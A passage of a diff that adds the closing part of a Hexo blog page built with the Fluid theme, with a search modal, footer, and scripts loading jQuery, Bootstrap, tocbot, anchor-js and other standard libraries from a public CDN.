+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
